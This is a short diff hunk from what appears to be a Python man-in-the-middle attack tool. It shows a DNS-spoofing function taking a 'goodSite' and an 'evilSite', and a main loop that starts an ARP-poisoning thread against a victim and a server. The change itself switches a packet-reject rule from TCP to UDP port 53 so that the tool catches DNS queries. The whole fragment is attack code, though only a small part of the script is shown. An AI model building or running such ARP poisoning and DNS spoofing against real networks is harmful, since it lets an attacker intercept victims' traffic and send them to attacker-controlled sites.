@@ -55,7 +55,7 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     
 def main() :
     pktCounter = 0
-    reject = Reject(proto='tcp', dport='53')
+    reject = Reject(proto='udp', dport='53')
     arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
     arpThread.start()
     while True: 
